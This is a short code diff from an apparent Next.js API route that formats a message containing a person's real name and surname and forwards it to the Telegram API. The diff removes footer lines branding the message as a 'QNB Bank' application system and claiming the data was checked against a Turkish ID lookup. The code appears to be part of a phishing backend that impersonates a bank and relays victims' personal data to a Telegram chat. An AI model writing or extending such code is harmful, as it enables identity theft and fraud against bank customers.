@@ -55,8 +55,7 @@ export async function POST(request: NextRequest) {
 ${telegramData.realName ? `👤 Ad Soyad: \`${telegramData.realName} ${telegramData.realSurname}\`` : ''}
 
 ---
-🏦 QNB Bank Başvuru Sistemi
-⚠️ Bu bilgiler gerçek TC sorgulama API'si ile doğrulanmıştır.
+
     `.trim()
 
     // Telegram API'sine istek gönder
